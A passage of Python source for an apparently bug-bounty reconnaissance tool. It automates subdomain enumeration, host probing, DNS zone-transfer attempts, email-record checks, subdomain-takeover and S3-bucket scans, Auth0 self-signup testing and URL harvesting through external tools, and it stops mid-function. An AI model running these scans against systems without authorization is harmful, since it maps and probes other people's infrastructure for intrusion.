import argparse
import concurrent.futures
import json
import os
import re
import subprocess
import shutil
import tempfile
import threading
import time
from datetime import datetime as date
from urllib.parse import urlparse
import logging
import logging_config
import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from tqdm import tqdm
import dns.resolver
import dns.zone
import dns.query
import yaml

# Import the logger
logger = logging.getLogger("Falcon")


def find_go_bin(name: str) -> str:
    """Return the full path to a Go tool, preferring ~/go/bin over anything
    else in PATH. This avoids picking up Python shims (e.g. httpx from pip)
    that shadow the real projectdiscovery binaries."""
    ext = ".exe" if os.name == "nt" else ""
    candidate = os.path.join(os.path.expanduser("~/go/bin"), name + ext)
    if os.path.isfile(candidate):
        return candidate
    return name  # fall back to whatever is first in PATH


class Colors:
    """Class to define ANSI color codes for terminal output"""

    def __init__(self):
        """Initialize color codes"""
        self.GREEN = "\033[32m"
        self.RED = "\033[31m"
        self.BLUE = "\033[34m"
        self.SKY_BLUE = "\033[38;5;153m"
        self.END = "\033[0m"


color = Colors()

# Banner for the script, displayed at the start
banner = rf"""{color.GREEN}
    ______      __                      __  __            __
   / ____/___ _/ /________  ____  ___  / / / /_  ______  / /____  _____
  / /_  / __ `/ / ___/ __ \/ __ \/ _ \/ /_/ / / / / __ \/ __/ _ \/ ___/
 / __/ / /_/ / / /__/ /_/ / / / /  __/ __  / /_/ / / / / /_/  __/ /
/_/    \__,_/_/\___/\____/_/ /_/\___/_/ /_/\__,_/_/ /_/\__/\___/_/
                                                            Coder: OctaYus0x01
                                                            https://github.com/octayus
                                                                                            {color.END}
"""

def loading_animation(task):
    """
    Decorator to display a spinner while a function executes concurrently.
    The function runs in a background thread so the animation reflects real time.
    """

    def decorator(func):
        def wrapper(*args, **kwargs):
            result_holder = [None]
            exc_holder    = [None]

            def run():
                try:
                    result_holder[0] = func(*args, **kwargs)
                except Exception as e:
                    exc_holder[0] = e

            t = threading.Thread(target=run, daemon=True)
            t.start()
            with tqdm(
                total=0,
                desc=task,
                bar_format="{desc} [{elapsed}]",
            ) as pbar:
                while t.is_alive():
                    time.sleep(0.1)
                    pbar.update(0)
            t.join()
            if exc_holder[0]:
                raise exc_holder[0]
            return result_holder[0]

        return wrapper

    return decorator


class MakeDirectories:
    """Class to handle directory creation for scan results"""

    def __init__(self, output_file):
        """
        Initialize with output directory path

        Args:
            output_file (str): Path to output directory
        """
        self.output_file = output_file

    @loading_animation(f"{color.GREEN}[+] Creating directories{color.END}")
    def mk_dirs(self):
        """Create directory structure for scan results"""
        try:
            # Validate output_file
            if not self.output_file:
                logger.error(
                    f"{color.RED}Error: Output directory not specified. Please provide an output directory with -o or --output.{color.END}"
                )
                return

            # Create the main output directory
            if not os.path.isdir(self.output_file):  # True
                os.makedirs(self.output_file)
            dirs_list = ["hosts", "urls", "vuln", "screenshots"]

            # Create subdirectories
            for d in dirs_list:
                os.makedirs(os.path.join(self.output_file, d), exist_ok=True)
                time.sleep(0.02)
                logger.info(
                    f"{color.GREEN}[+] {d} Directory successfully created{color.END}"
                )

            logger.info(f"\n{color.SKY_BLUE}{'=' * 40}{color.END}\n")

            # Create files in the 'hosts' directory
            hosts_files = [
                "alive-hosts.txt",
                "httpx.txt",
                "subs.txt",
                "https-alive.txt",
                "cnames.txt",
                "zone-transfer.txt",
            ]
            for f in hosts_files:
                open(os.path.join(
                    f"{self.output_file}/hosts/", f), "w").close()
                time.sleep(0.02)
                logger.info(
                    f"{color.SKY_BLUE}[+] {f} File successfully created{color.END}"
                )

            # Create files in the 'urls' directory
            urls_files = [
                "all-urls.txt",
                "js-files.txt",
                "leaked-docs.txt",
                "mantra_output.txt",
                "params.txt",
                "gf-xss.txt",
                "gf-ssrf.txt",
                "gf-lfi.txt",
                "gf-ssti.txt",
                "gf-sqli.txt",
                "gf-redirect.txt",
            ]
            for u in urls_files:
                open(os.path.join(f"{self.output_file}/urls/", u), "w").close()
                time.sleep(0.02)
                logger.info(
                    f"{color.SKY_BLUE}[+] {u} File successfully created{color.END}"
                )

            # Create files in the 'vuln' directory
            vuln_files = [
                "nuclei-output.txt",
                "nuclei-dast-output.txt",
                "ffuf-output.txt",
                "xss.txt",
                "lfi.txt",
                "ssrf.txt",
                "sqli.txt",
                "ssti.txt",
                "js-findings.txt",
                "missing-dmarc.json",
                "takeovers.json",
                "subzy.txt",
                "aws_vuln_bucket.txt",
                "lfi-urls.txt",
                "lfi-subs.txt",
                "cors.txt",
                "crlf.txt",
                "403-bypass.txt",
                "api-endpoints.txt",
                "dirsearch-output.txt",
                "dalfox-xss.txt",
                "open-redirects.txt",
                "secrets.txt",
                "trufflehog.txt",
                "waf.txt",
                "params-arjun.txt",
            ]
            for v in vuln_files:
                open(os.path.join(f"{self.output_file}/vuln/", v), "w").close()
                time.sleep(0.02)
                logger.info(
                    f"{color.SKY_BLUE}[+] {v} File successfully created{color.END}"
                )

        except Exception as e:
            logger.exception(
                f"{color.RED}Error creating directories: {e}{color.END}")


class SubdomainsCollector:
    """Class to collect and probe subdomains"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file

    def subfinder_subs(self):
        """Use subfinder + amass to enumerate subdomains, then dnsx to resolve"""
        domains = self.domains
        output = f"{self.output_file}/hosts/subs.txt"

        # subfinder
        try:
            logger.info(f"{color.GREEN}(+) Subdomain enumeration (subfinder){color.END}")
            subprocess.run(["subfinder", "-dL", domains, "-all", "-o", output], check=True)
        except FileNotFoundError:
            logger.warning(f"{color.RED}(-) subfinder not found in PATH{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}Error occurred: {e}{color.END}")

        # amass passive — appends unique results via anew
        try:
            if shutil.which("amass"):
                logger.info(f"{color.GREEN}(+) Subdomain enumeration (amass passive){color.END}")
                amass_tmp = tempfile.mktemp(suffix=".txt")
                try:
                    p = subprocess.run(
                        ["amass", "enum", "-passive", "-nocolor",
                         "-dL", domains, "-o", amass_tmp],
                        capture_output=True, timeout=600,
                    )
                    if p.returncode != 0 and p.stderr:
                        logger.debug(f"amass stderr: {p.stderr.decode(errors='replace')}")
                    if os.path.isfile(amass_tmp) and os.path.getsize(amass_tmp) > 0:
                        with open(amass_tmp, "rb") as af:
                            subprocess.run(["anew", output], input=af.read(),
                                           capture_output=True, timeout=60)
                finally:
                    if os.path.isfile(amass_tmp):
                        os.unlink(amass_tmp)
        except FileNotFoundError:
            logger.warning(f"{color.RED}(-) amass not found in PATH (optional){color.END}")
        except subprocess.TimeoutExpired:
            logger.warning(f"{color.RED}(-) amass timed out{color.END}")
        except Exception as e:
            logger.debug(f"amass failed: {e}")

        # dnsx — resolve / filter only live DNS entries
        try:
            if shutil.which("dnsx") and os.path.isfile(output) and os.path.getsize(output) > 0:
                logger.info(f"{color.GREEN}(+) DNS resolution with dnsx{color.END}")
                resolved = f"{self.output_file}/hosts/subs-resolved.txt"
                p = subprocess.run(
                    ["dnsx", "-l", output, "-o", resolved, "-silent"],
                    capture_output=True, timeout=600,
                )
                if os.path.isfile(resolved) and os.path.getsize(resolved) > 0:
                    shutil.copy2(resolved, output)
                    logger.info(f"{color.GREEN}(+) dnsx resolved subs saved to {output}{color.END}")
        except FileNotFoundError:
            logger.warning(f"{color.RED}(-) dnsx not found in PATH (optional){color.END}")
        except subprocess.TimeoutExpired:
            logger.warning(f"{color.RED}(-) dnsx timed out{color.END}")
        except Exception as e:
            logger.debug(f"dnsx failed: {e}")

    def probe(self):
        """Probe subdomains to check which are alive using httpx"""
        subdomains_file = f"{self.output_file}/hosts/subs.txt"
        httpx_output = f"{self.output_file}/hosts/httpx.txt"
        alive_output = f"{self.output_file}/hosts/alive-hosts.txt"
        try:
            httpx_cmd = [
                find_go_bin("httpx"),
                "-list", subdomains_file,
                "-sc",
                "-title",
                "-fr",
                "-tech-detect",
                "-ip",
                "-cname",
                "-cdn",
                "-favicon",
                "-o", httpx_output,
            ]
            logger.info(f"{color.GREEN}(+) Probing alive hosts{color.END}")
            subprocess.run(httpx_cmd, check=True)
            # Append only new alive targets to avoid duplicates across reruns.
            existing = set()
            if os.path.isfile(alive_output):
                with open(alive_output, "r", encoding="utf-8", errors="replace") as existing_f:
                    for line in existing_f:
                        existing.add(line.strip())
            new_lines = []
            with open(httpx_output, "r", encoding="utf-8", errors="replace") as infile:
                for line in infile:
                    parts = line.split()
                    if not parts:
                        continue
                    http_domain = parts[0]
                    if "http" in http_domain and http_domain not in existing:
                        existing.add(http_domain)
                        new_lines.append(http_domain)
            if new_lines:
                with open(alive_output, "a", encoding="utf-8") as outfile:
                    outfile.write("\n".join(new_lines) + "\n")

            # Populate https-alive.txt from alive-hosts.txt
            https_output = f"{self.output_file}/hosts/https-alive.txt"
            if os.path.isfile(alive_output):
                with open(alive_output, "r", encoding="utf-8", errors="replace") as af:
                    https_lines = [l.strip() for l in af if l.strip().startswith("https://")]
                if https_lines:
                    with open(https_output, "w", encoding="utf-8") as hf:
                        hf.write("\n".join(https_lines) + "\n")

        except FileNotFoundError:
            logger.warning(
                f"{color.RED}(-) httpx not found in PATH{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}Error occurred: {e}{color.END}")


class DmarcFinder:
    """Class to check for DMARC and SPF records"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file

    def check_spf(self, domain):
        """
        Check if SPF record exists for a domain

        Args:
            domain (str): Domain to check

        Returns:
            bool: True if SPF record exists, False otherwise
        """
        try:
            resolver = dns.resolver.Resolver()
            resolver.timeout = 3
            resolver.lifetime = 6
            answers = resolver.resolve(domain, "TXT")
            for record in answers:
                if record.to_text().startswith('"v=spf1'):
                    return True
            return False
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.LifetimeTimeout):
            return False
        except Exception as e:
            logger.exception(f"Error checking SPF for {domain}: {e}")
            return False

    def check_dmarc(self, domain):
        """
        Check if DMARC record exists for a domain

        Args:
            domain (str): Domain to check

        Returns:
            bool: True if DMARC record exists, False otherwise
        """
        try:
            resolver = dns.resolver.Resolver()
            resolver.timeout = 3
            resolver.lifetime = 6
            answers = resolver.resolve(f"_dmarc.{domain}", "TXT")
            for record in answers:
                if record.to_text().startswith('"v=DMARC1'):
                    return True
            return False
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.LifetimeTimeout):
            return False
        except Exception as e:
            logger.exception(f"Error checking DMARC for {domain}: {e}")
            return False

    _DKIM_SELECTORS = ["default", "google", "mail", "dkim", "selector1", "selector2", "k1", "smtp"]

    def check_dkim(self, domain):
        """Check common DKIM selectors for a domain. Returns the first working selector or None."""
        resolver = dns.resolver.Resolver()
        resolver.timeout = 2
        resolver.lifetime = 4
        for sel in self._DKIM_SELECTORS:
            try:
                answers = resolver.resolve(f"{sel}._domainkey.{domain}", "TXT")
                for record in answers:
                    if "v=DKIM1" in record.to_text():
                        return sel
            except Exception:
                continue
        return None

    def check_zone_transfer(self):
        """Attempt DNS zone transfer (AXFR) against all target domains."""
        output = f"{self.output_file}/hosts/zone-transfer.txt"
        try:
            with open(self.domains, "r") as f:
                domains_list = [d.strip() for d in f if d.strip()]
            findings = []
            logger.info(f"{color.GREEN}(+) Testing DNS zone transfer (AXFR){color.END}")
            for domain in domains_list:
                try:
                    ns_answers = dns.resolver.resolve(domain, "NS")
                    for ns in ns_answers:
                        ns_host = str(ns.target).rstrip(".")
                        try:
                            zone = dns.zone.from_xfr(dns.query.xfr(ns_host, domain, timeout=5))
                            record_count = len(list(zone.nodes.keys()))
                            msg = f"[!] ZONE TRANSFER ALLOWED: {domain} via {ns_host} ({record_count} records)"
                            findings.append(msg)
                            logger.warning(f"{color.RED}{msg}{color.END}")
                        except Exception:
                            pass
                except Exception:
                    pass
            with open(output, "w", encoding="utf-8") as f:
                f.write("\n".join(findings) + "\n" if findings else "")
            if findings:
                logger.warning(f"{color.RED}[!] {len(findings)} zone transfer(s) possible → {output}{color.END}")
            else:
                logger.info(f"{color.GREEN}(+) No zone transfers allowed{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}Error in zone transfer check: {e}{color.END}")

    def validate_domains(self):
        """Validate DMARC, SPF, and DKIM records for all domains in the input file"""
        logger.info(
            f"{color.GREEN}(+) Checking for DMARC, SPF, DKIM records{color.END}")
        try:
            with open(self.domains, "r") as file:
                domains_list = [d.strip() for d in file if d.strip()]

            results = []
            for domain in tqdm(domains_list, desc="Checking DMARC/SPF/DKIM"):
                spf_valid   = self.check_spf(domain)
                dmarc_valid = self.check_dmarc(domain)
                dkim_sel    = self.check_dkim(domain)

                result = {
                    "domain":       domain,
                    "spf_valid":    spf_valid,
                    "dmarc_valid":  dmarc_valid,
                    "dkim_valid":   dkim_sel is not None,
                    "dkim_selector": dkim_sel,
                    "status":       "Valid" if spf_valid and dmarc_valid and dkim_sel else "Vulnerable",
                }
                results.append(result)
                if not spf_valid or not dmarc_valid or not dkim_sel:
                    missing = []
                    if not spf_valid:   missing.append("SPF")
                    if not dmarc_valid: missing.append("DMARC")
                    if not dkim_sel:    missing.append("DKIM")
                    logger.info(f"{color.RED}(-) {domain} missing: {', '.join(missing)}{color.END}")

            output_json = f"{self.output_file}/vuln/missing-dmarc.json"
            with open(output_json, "w") as f_out:
                json.dump(results, f_out, indent=4)

            vulnerable = sum(1 for r in results if r["status"] == "Vulnerable")
            logger.info(
                f"{color.GREEN}[+] Email security check done — {vulnerable}/{len(results)} domain(s) vulnerable → {output_json}{color.END}"
            )
            logger.info(f"\n{color.SKY_BLUE}{'=' * 40}{color.END}\n")

        except Exception as e:
            logger.exception(
                f"{color.RED}Error in validate_domains method: {e}{color.END}"
            )


class SubdomainTakeOver:
    """Class to check for potential subdomain takeovers"""

    def __init__(self, domains, output_file, auth0_email=""):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file
        self.auth0_email = auth0_email

    def get_cname(self):
        """Get CNAME records for all subdomains"""
        output = f"{self.output_file}/hosts/cnames.txt"
        subdomains_file = f"{self.output_file}/hosts/subs.txt"
        try:
            if not os.path.isfile(subdomains_file) or os.path.getsize(subdomains_file) == 0:
                logger.warning(
                    f"{color.RED}(-) No subdomains file or empty, skipping CNAME{color.END}")
                return
            logger.info(
                f"{color.GREEN}(+) CNAME analysis for possible takeovers{color.END}"
            )
            cnfinder_cmd = ["cnfinder", "-l", subdomains_file, "-o", output]
            p = subprocess.run(cnfinder_cmd, capture_output=True, timeout=300)
            if p.returncode != 0 and p.stderr:
                logger.debug(
                    f"cnfinder stderr: {p.stderr.decode(errors='replace')}")
            if os.path.isfile(output) and os.path.getsize(output) > 0:
                with open(output, "r", encoding="utf-8", errors="replace") as f:
                    cnames = f.read().splitlines()
                logger.info(
                    f"{color.GREEN}(+) Found total of: {len(cnames)} CNAME. {color.END}")
        except FileNotFoundError:
            logger.warning(
                f"{color.RED}(-) cnfinder not found in PATH{color.END}")
        except subprocess.TimeoutExpired:
            logger.warning(f"{color.RED}(-) cnfinder timed out{color.END}")
        except Exception as e:
            logger.exception(
                f"{color.RED}Error reading subdomains/CNAME: {e}{color.END}")

    def test_takeover(self):
        """Test for potential subdomain takeovers using subzy."""
        subs_file = f"{self.output_file}/hosts/subs.txt"
        subzy_out = f"{self.output_file}/vuln/subzy.txt"
        if not os.path.isfile(subs_file) or os.path.getsize(subs_file) == 0:
            logger.debug("No subdomains file for takeover tests, skipping")
            return
        try:
            logger.info(
                f"{color.GREEN}(+) Running subzy for takeover detection{color.END}")
            p = subprocess.run(
                ["subzy", "run", "--targets", os.path.abspath(subs_file), "--hide-fails"],
                capture_output=True,
                timeout=600,
            )
            if p.stdout and p.stdout.strip():
                with open(subzy_out, "wb") as f:
                    f.write(p.stdout)
            if p.returncode != 0 and p.stderr:
                logger.debug(
                    f"subzy stderr: {p.stderr.decode(errors='replace')}")
        except FileNotFoundError:
            logger.warning(
                f"{color.RED}(-) subzy not found in PATH (optional){color.END}")
        except subprocess.TimeoutExpired:
            logger.warning(f"{color.RED}(-) subzy timed out{color.END}")
        except Exception as e:
            logger.debug(f"subzy failed: {e}")

        # Parse subzy findings → takeovers.json
        takeovers = []
        try:
            if os.path.isfile(subzy_out):
                with open(subzy_out, "r", encoding="utf-8", errors="replace") as f:
                    for line in f:
                        line = line.strip()
                        if "[VULNERABLE]" in line.upper() and "[NOT VULNERABLE]" not in line.upper():
                            # subzy format: [VULNERABLE] subdomain - service
                            parts = line.split("]", 1)[-1].strip().split(" - ", 1)
                            subdomain = parts[0].strip() if parts else line
                            service = parts[1].strip() if len(parts) > 1 else "unknown"
                            takeovers.append({"subdomain": subdomain, "service": service, "tool": "subzy"})
                            logger.info(f"{color.RED}[!] Takeover: {subdomain} ({service}) via subzy{color.END}")
        except Exception as e:
            logger.debug(f"Error parsing subzy output: {e}")

        takeovers_json = f"{self.output_file}/vuln/takeovers.json"
        try:
            with open(takeovers_json, "w", encoding="utf-8") as jf:
                json.dump(takeovers, jf, indent=4)
            if takeovers:
                logger.info(f"{color.RED}[!] {len(takeovers)} subdomain takeover(s) found → {takeovers_json}{color.END}")
            else:
                logger.info(f"{color.GREEN}(+) No subdomain takeovers found{color.END}")
        except Exception as e:
            logger.debug(f"Error writing takeovers.json: {e}")

    def auth0(self):
        """
        Test for Auth0 unauthenticated account creation (BadAuth0).
        """
        if not self.auth0_email:
            return
        tenants_file = f"{self.output_file}/hosts/alive-hosts.txt"
        if not os.path.isfile(tenants_file) or os.path.getsize(tenants_file) == 0:
            logger.info(
                f"{color.SKY_BLUE}(-) No alive hosts for Auth0 test, skipping{color.END}")
            return
        output_dir = f"{self.output_file}/hosts/auth0/"
        os.makedirs(output_dir, exist_ok=True)
        try:
            logger.info(
                f"{color.GREEN}(+) Testing for Auth0 self account signup{color.END}")
            badauth0_cmd = [
                "BadAuth0",
                "-l", tenants_file,
                "-o", output_dir,
                "-e", self.auth0_email,
            ]
            subprocess.run(badauth0_cmd, check=True)
            logger.info(
                f"{color.GREEN}(+) BadAuth0 scan completed → {output_dir}{color.END}")
        except FileNotFoundError:
            logger.warning(
                f"{color.RED}(-) BadAuth0 not found in PATH (optional){color.END}")
        except subprocess.CalledProcessError as e:
            logger.warning(
                f"{color.RED}(-) BadAuth0 failed (optional): {e}{color.END}")
        except Exception as e:
            logger.warning(
                f"{color.RED}(-) BadAuth0 error (optional): {e}{color.END}")


class BucketFinder:
    """Class to find and test S3 buckets for misconfigurations"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file

        logger.info(f"{color.GREEN}Initialising BucketFinder...{color.END}")

    def buckets_cli(self):
        """Main method to extract AWS CNAMEs and optionally test bucket permissions (s3scanner if in PATH)."""
        cnames_file = f"{self.output_file}/hosts/cnames.txt"
        aws_cnames_output = f"{self.output_file}/hosts/aws_cnames.txt"
        try:
            if not os.path.isfile(cnames_file) or os.path.getsize(cnames_file) == 0:
                logger.info(
                    f"{color.SKY_BLUE}(-) No CNAME records found, skipping CNAME-based bucket check{color.END}")
                return
            logger.info(
                f"{color.SKY_BLUE}Reading CNAMEs from {cnames_file}{color.END}")
            bucket_count = 0
            with open(cnames_file, "r", encoding="utf-8", errors="replace") as infile, open(
                    aws_cnames_output, "w", encoding="utf-8"
            ) as outfile:
                for line in infile:
                    parts = line.strip().split()
                    if len(parts) >= 3 and "s3" in parts[2] and "amazonaws" in parts[2]:
                        bucket = parts[2].strip(".")
                        outfile.write(bucket + "\n")
                        bucket_count += 1
                        logger.debug(
                            f"{color.BLUE}Found AWS CNAME: {bucket}{color.END}"
                        )

            if bucket_count > 0:
                logger.info(
                    f"{color.SKY_BLUE}AWS CNAMEs written to {aws_cnames_output}. "
                    "To test bucket permissions, install e.g. s3scanner and run it on that file.{color.END}"
                )
                try:
                    if shutil.which("s3scanner"):
                        scan_out = f"{self.output_file}/vuln/aws_vuln_bucket.txt"
                        subprocess.run(
                            ["s3scanner", "scan", "-l",
                                aws_cnames_output, "-o", scan_out],
                            capture_output=True,
                            timeout=900,
                        )
                        logger.info(
                            f"{color.GREEN}(+) s3scanner bucket check completed{color.END}")
                except (FileNotFoundError, subprocess.TimeoutExpired) as e:
                    logger.debug(f"s3scanner skip: {e}")
            else:
                logger.info(
                    f"{color.SKY_BLUE}No AWS CNAMEs found in CNAME list.{color.END}")
        except FileNotFoundError as e:
            logger.warning(f"{color.RED}(-) {e}{color.END}")
        except Exception as e:
            logger.exception(
                f"{color.RED}Error in buckets_cli: {e}{color.END}")

    def aws_extractor(self):
        try:
            urls_file = f"{self.output_file}/urls/all-urls.txt"
            output_file = f"{self.output_file}/urls/aws_vuln_bucket.txt"
            if not os.path.isfile(urls_file) or os.path.getsize(urls_file) == 0:
                logger.warning(
                    f"{color.RED}(-) No URLs file for aws_extractor, skipping{color.END}")
                return
            aws_cmd = ["aws_extractor", "-u", urls_file,
                       "-test-takeover", "-o", output_file]
            subprocess.run(aws_cmd)
        except FileNotFoundError:
            logger.warning(f"{color.RED}(-) aws_extractor not found in PATH{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}Error Occurred: {e}{color.END}")


class WafDetector:
    """Detect WAF presence on alive hosts using wafw00f"""

    def __init__(self, output_file):
        self.output_file = output_file

    def detect(self):
        hosts_file = f"{self.output_file}/hosts/alive-hosts.txt"
        output     = f"{self.output_file}/vuln/waf.txt"
        if not os.path.isfile(hosts_file) or os.path.getsize(hosts_file) == 0:
            logger.info(f"{color.SKY_BLUE}(-) No alive hosts for WAF detection, skipping{color.END}")
            return
        try:
            logger.info(f"{color.GREEN}(+) Detecting WAFs with wafw00f{color.END}")
            p = subprocess.run(
                ["wafw00f", "-i", hosts_file, "-o", output, "-f", "txt"],
                capture_output=True, timeout=600,
            )
            if os.path.isfile(output) and os.path.getsize(output) > 0:
                with open(output, encoding="utf-8", errors="replace") as f:
                    detected = [l.strip() for l in f if l.strip()]
                logger.info(f"{color.GREEN}(+) WAF detection done — {len(detected)} result(s) → {output}{color.END}")
            else:
                logger.info(f"{color.SKY_BLUE}(-) No WAFs detected{color.END}")
        except FileNotFoundError:
            logger.warning(f"{color.RED}(-) wafw00f not found in PATH (optional){color.END}")
        except subprocess.TimeoutExpired:
            logger.warning(f"{color.RED}(-) wafw00f timed out{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}Error in WAF detection: {e}{color.END}")


class ScreenshotCapture:
    """Capture screenshots of alive hosts using gowitness"""

    def __init__(self, output_file):
        self.output_file = output_file

    def capture(self):
        hosts_file      = f"{self.output_file}/hosts/alive-hosts.txt"
        screenshots_dir = f"{self.output_file}/screenshots"
        os.makedirs(screenshots_dir, exist_ok=True)
        if not os.path.isfile(hosts_file) or os.path.getsize(hosts_file) == 0:
            logger.info(f"{color.SKY_BLUE}(-) No alive hosts for screenshots, skipping{color.END}")
            return
        try:
            logger.info(f"{color.GREEN}(+) Capturing screenshots with gowitness{color.END}")
            subprocess.run(
                ["gowitness", "file", "-f", hosts_file,
                 "--screenshot-path", screenshots_dir,
                 "--disable-db"],
                capture_output=True, timeout=900,
            )
            screenshots = [
                f for f in os.listdir(screenshots_dir)
                if f.lower().endswith((".png", ".jpg", ".jpeg"))
            ]
            logger.info(
                f"{color.GREEN}(+) {len(screenshots)} screenshot(s) saved → {screenshots_dir}{color.END}")
        except FileNotFoundError:
            logger.warning(f"{color.RED}(-) gowitness not found in PATH (optional){color.END}")
        except subprocess.TimeoutExpired:
            logger.warning(f"{color.RED}(-) gowitness timed out{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}Error in screenshot capture: {e}{color.END}")


class ParameterDiscovery:
    """Discover hidden GET/POST parameters using arjun"""

    def __init__(self, output_file):
        self.output_file = output_file

    def discover(self):
        hosts_file = f"{self.output_file}/hosts/alive-hosts.txt"
        output     = f"{self.output_file}/vuln/params-arjun.txt"
        if not os.path.isfile(hosts_file) or os.path.getsize(hosts_file) == 0:
            logger.info(f"{color.SKY_BLUE}(-) No alive hosts for parameter discovery, skipping{color.END}")
            return
        try:
            logger.info(f"{color.GREEN}(+) Discovering hidden parameters with arjun{color.END}")
            subprocess.run(
                ["arjun", "-i", hosts_file, "-oT", output, "--stable"],
                timeout=1200,
            )
            if os.path.isfile(output) and os.path.getsize(output) > 0:
                with open(output, encoding="utf-8", errors="replace") as f:
                    count = sum(1 for l in f if l.strip())
                logger.info(f"{color.GREEN}(+) Found {count} parameter(s) → {output}{color.END}")
            else:
                logger.info(f"{color.SKY_BLUE}(-) No hidden parameters found{color.END}")
        except FileNotFoundError:
            logger.warning(f"{color.RED}(-) arjun not found in PATH (optional){color.END}")
        except subprocess.TimeoutExpired:
            logger.warning(f"{color.RED}(-) arjun timed out{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}Error in parameter discovery: {e}{color.END}")


class UrlFinder:
    """Class to find and analyze URLs from target domains"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file
        self.all_urls = f"{self.output_file}/urls/all-urls.txt"
        self.js_output = f"{self.output_file}/urls/js-files.txt"
        self.leaked_docs = f"{self.output_file}/urls/leaked-docs.txt"
        self.mantra_output = f"{self.output_file}/urls/mantra_output.txt"
        self.js_findings = f"{self.output_file}/urls/js-findings.txt"

    def _filter_urls_by_regex(self, urls_file, pattern_re, dest_file):
        """Filter lines from urls_file by regex (Python-based, Windows-safe, no grep). Append unique lines to dest_file via anew."""
        try:
            if not os.path.isfile(urls_file) or os.path.getsize(urls_file) == 0:
                return
            pattern = re.compile(pattern_re)
            with open(urls_file, "rb") as f:
                lines = [
                    line.decode(
                        "utf-8", errors="replace").split("?")[0].strip()
                    for line in f
                    if pattern.search(line.decode("utf-8", errors="replace"))
                ]
            unique = sorted(set(ln for ln in lines if ln))
            if not unique:
                return
            out = b"".join((ln + "\n").encode("utf-8") for ln in unique)
            subprocess.run(
                ["anew", dest_file],
                input=out,
                capture_output=True,
                timeout=60,
            )
        except FileNotFoundError:
            logger.warning(f"{color.RED}(-) anew not found in PATH{color.END}")

    def collect_urls(self):
        """Collect URLs from various sources (wayback, gau, etc)"""
        subdomains_file = f"{self.output_file}/hosts/alive-hosts.txt"
        urls = f"{self.output_file}/urls/all-urls.txt"
        try:
            logger.info(f"{color.GREEN}(+) Collecting all URLs{color.END}")
            depth_level = 5
            katana_cmd = [
                "katana", "-list", subdomains_file,
                "-d", str(depth_level),
                "-jc",   # crawl JS files for endpoints
                "-fx",   # extract form action targets
                "-o", urls,
            ]
            subprocess.run(katana_cmd, check=True)
        except FileNotFoundError:
            logger.warning(
                f"{color.RED}(-) katana not found in PATH{color.END}")
        except subprocess.TimeoutExpired:
            logger.warning("katana timed out, skipping")

        try:
            if not os.path.isfile(subdomains_file) or os.path.getsize(subdomains_file) == 0:
                logger.warning(
                    f"{color.RED}(-) alive-hosts file missing or empty, skipping passive URL collection{color.END}")
            else:
                # Run waybackurls, gau, waymore, and paramspider in parallel
                def _run_waybackurls():
                    try:
                        with open(subdomains_file, "rb") as f_in:
                            p = subprocess.run(["waybackurls"], stdin=f_in,
                                               capture_output=True, timeout=600)
                        if p.returncode != 0 and p.stderr:
                            logger.debug(f"waybackurls stderr: {p.stderr.decode(errors='replace')}")
                        return ("urls", p.stdout if p.stdout and p.stdout.strip() else b"")
                    except FileNotFoundError:
                        logger.warning(f"{color.RED}(-) waybackurls not found in PATH{color.END}")
                    except subprocess.TimeoutExpired:
                        logger.warning("waybackurls timed out, skipping")
                    return ("urls", b"")

                def _run_gau():
                    try:
                        with open(subdomains_file, "rb") as f_in:
                            p = subprocess.run(
                                ["gau", "-subs", "-providers", "otx,commoncrawl", "-t", "5"],
                                stdin=f_in, capture_output=True, timeout=600)
                        if p.returncode != 0 and p.stderr:
                            logger.debug(f"gau stderr: {p.stderr.decode(errors='replace')}")
                        return ("urls", p.stdout if p.stdout and p.stdout.strip() else b"")
                    except FileNotFoundError:
                        logger.warning(f"{color.RED}(-) gau not found in PATH{color.END}")
                    except subprocess.TimeoutExpired:
                        logger.warning("gau timed out, skipping")
                    return ("urls", b"")

                def _run_waymore():
                    if not shutil.which("waymore"):
                        return ("urls", b"")
                    try:
                        logger.info(f"{color.GREEN}(+) Running waymore for URL collection{color.END}")
                        with open(subdomains_file, "r", encoding="utf-8") as sf:
                            hosts_list = [h.strip() for h in sf if h.strip()]
                        collected = b""
                        for host in hosts_list:
                            domain = urlparse(host).netloc or host
                            p_wm = subprocess.run(
                                ["waymore", "-i", domain, "-mode", "U", "-oU", "-"],
                                capture_output=True, timeout=300)
                            if p_wm.stdout and p_wm.stdout.strip():
                                collected += p_wm.stdout
                        return ("urls", collected)
                    except FileNotFoundError:
                        logger.warning(f"{color.RED}(-) waymore not found in PATH{color.END}")
                    except subprocess.TimeoutExpired:
                        logger.warning("waymore timed out, skipping")
                    except Exception as e:
                        logger.debug(f"waymore failed: {e}")
                    return ("urls", b"")

                def _run_paramspider():
                    params_out = f"{self.output_file}/urls/params.txt"
                    try:
                        logger.info(f"{color.GREEN}(+) Running paramspider for parameter discovery{color.END}")
                        p_ps = subprocess.run(
                            ["paramspider", "-l", subdomains_file],
                            capture_output=True, timeout=600)
                        return ("params", p_ps.stdout if p_ps.stdout and p_ps.stdout.strip() else b"")
                    except FileNotFoundError:
